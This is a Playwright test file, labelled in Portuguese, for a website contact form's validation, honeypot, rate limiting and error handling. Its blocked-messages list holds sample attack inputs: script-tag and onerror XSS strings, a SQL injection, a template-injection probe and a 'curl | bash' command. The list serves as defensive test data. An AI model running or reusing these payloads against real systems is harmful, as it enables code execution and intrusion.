import { expect, test, type Page } from '@playwright/test';
import { openPage, pages } from './support';

const MIN_FILL_TIME = 3200;

const validEntry = {
  nome: 'Maria',
  sobrenome: 'Silva',
  email: 'maria.silva@empresa.com.br',
  telefone: '+55 61 99999-0000',
  assunto: 'job',
  mensagem: 'Olá! Gostaria de conversar sobre uma vaga de desenvolvimento na nossa equipe.',
};

type Entry = Partial<typeof validEntry>;

interface CapturedRequest {
  body: Record<string, string>;
  headers: Record<string, string>;
}

async function setupForm(page: Page, status = 200): Promise<CapturedRequest[]> {
  const requests: CapturedRequest[] = [];
  await page.route('https://formspree.io/**', async (route) => {
    requests.push({
      body: route.request().postDataJSON() as Record<string, string>,
      headers: route.request().headers(),
    });
    await route.fulfill({
      status,
      contentType: 'application/json',
      body: status === 200 ? '{"ok":true}' : '{"errors":[{"message":"erro"}]}',
    });
  });
  await openPage(page, pages.pt);
  await page.locator('#contato').scrollIntoViewIfNeeded();
  return requests;
}

async function fill(page: Page, entry: Entry): Promise<void> {
  for (const [field, value] of Object.entries(entry)) {
    if (field === 'assunto') await page.selectOption('select[name="assunto"]', value);
    else await page.fill(`[name="${field}"]`, value);
  }
}

const submit = (page: Page) => page.locator('[data-form-submit]').click();
const fieldError = (page: Page, field: string) => page.locator(`[data-error-for="${field}"]`);
const status = (page: Page) => page.locator('[data-form-status]');

test.describe('formulário de contato', () => {
  test('não possui campo de envio de arquivos', async ({ page }) => {
    await setupForm(page);
    await expect(page.locator('[data-contact-form] input[type="file"]')).toHaveCount(0);
  });

  test('aponta os campos obrigatórios vazios e foca o primeiro', async ({ page }) => {
    const requests = await setupForm(page);
    await submit(page);
    for (const field of ['nome', 'email', 'assunto', 'mensagem']) {
      await expect(fieldError(page, field)).toBeVisible();
    }
    await expect(fieldError(page, 'sobrenome')).toBeHidden();
    await expect(fieldError(page, 'telefone')).toBeHidden();
    await expect(page.locator('[name="nome"]')).toBeFocused();
    await expect(page.locator('[name="nome"]')).toHaveAttribute('aria-invalid', 'true');
    expect(requests).toHaveLength(0);
  });

  test('rejeita e-mails inválidos e descartáveis', async ({ page }) => {
    await setupForm(page);
    await fill(page, { ...validEntry, email: 'maria@' });
    await submit(page);
    await expect(fieldError(page, 'email')).toContainText('válido');
    await fill(page, { email: 'teste@mailinator.com' });
    await submit(page);
    await expect(fieldError(page, 'email')).toContainText('permanente');
  });

  const blockedMessages: [string, string][] = [
    ['tags HTML', 'Olá <script>alert(1)</script> tudo bem com você hoje?'],
    ['entidades HTML', 'Teste &lt;img src=x onerror=alert(1)&gt; mensagem longa'],
    ['links', 'Visite https://site-suspeito.example agora mesmo para ganhar'],
    ['domínios soltos', 'Acesse promocao-imperdivel.xyz para saber mais detalhes'],
    ['injeção SQL', "Mensagem com ' OR 1=1 -- e mais texto para passar do mínimo"],
    ['injeção de template', 'Mensagem com {{ constructor.constructor }} e mais texto aqui'],
    ['comandos de terminal', 'Rode isso: ; curl -s http://x | bash e veja o resultado agora'],
    [
      'caracteres invisíveis',
      `Mensagem com caractere${String.fromCodePoint(0x200b)}invisível no meio do texto aqui`,
    ],
    ['repetição excessiva', 'Olá aaaaaaaaaaaaaaaa mensagem repetida para testar a regra'],
    ['texto em maiúsculas', 'ESTA MENSAGEM ESTA TODA ESCRITA EM LETRAS MAIUSCULAS GRITANDO'],
    ['ofensas', 'Olá, seu idiota, quero falar sobre o projeto de vocês.'],
    ['ofensas disfarçadas', 'Seu 1d10t4 quero falar sobre o projeto de vocês agora.'],
  ];

  for (const [name, message] of blockedMessages) {
    test(`bloqueia ${name}`, async ({ page }) => {
      const requests = await setupForm(page);
      await fill(page, { ...validEntry, mensagem: message });
      await submit(page);
      await expect(fieldError(page, 'mensagem')).toBeVisible();
      expect(requests).toHaveLength(0);
    });
  }

  test('aceita texto técnico legítimo', async ({ page }) => {
    await setupForm(page);
    await fill(page, {
      ...validEntry,
      mensagem: 'Trabalho com computação e análise de dados em Node.js e ASP.NET, vamos conversar?',
    });
    await submit(page);
    await expect(fieldError(page, 'mensagem')).toBeHidden();
  });

  test('campo armadilha preenchido simula sucesso sem enviar', async ({ page }) => {
    const requests = await setupForm(page);
    await fill(page, validEntry);
    await page.evaluate(() => {
      const trap = document.querySelector<HTMLInputElement>('[data-form-trap]');
      if (trap) trap.value = 'preenchido por robô';
    });
    await page.waitForTimeout(MIN_FILL_TIME);
    await submit(page);
    await expect(status(page)).toHaveAttribute('data-tone', 'success');
    expect(requests).toHaveLength(0);
  });

  test('envia dados válidos, limpa o formulário e limita reenvios', async ({ page }) => {
    const requests = await setupForm(page);
    await fill(page, validEntry);
    await submit(page);
    await expect(status(page)).toContainText('segundos');
    expect(requests).toHaveLength(0);

    await page.waitForTimeout(MIN_FILL_TIME);
    await submit(page);
    await expect(status(page)).toHaveAttribute('data-tone', 'success');
    expect(requests).toHaveLength(1);

    const [request] = requests;
    expect(Object.keys(request?.body ?? {}).sort()).toEqual([
      '_subject',
      'assunto',
      'email',
      'idioma',
      'mensagem',
      'nome',
      'sobrenome',
      'telefone',
    ]);
    expect(request?.body.assunto).toBe('Oportunidade de emprego');
    expect(request?.headers.accept).toBe('application/json');
    await expect(page.locator('[name="nome"]')).toHaveValue('');

    await fill(page, validEntry);
    await page.waitForTimeout(MIN_FILL_TIME);
    await submit(page);
    await expect(status(page)).toContainText('recentemente');
    expect(requests).toHaveLength(1);
  });

  test('informa falha do servidor e reabilita o envio', async ({ page }) => {
    await setupForm(page, 500);
    await fill(page, validEntry);
    await page.waitForTimeout(MIN_FILL_TIME);
    await submit(page);
    await expect(status(page)).toHaveAttribute('data-tone', 'error');
    await expect(page.locator('[data-form-submit]')).toBeEnabled();
  });
});
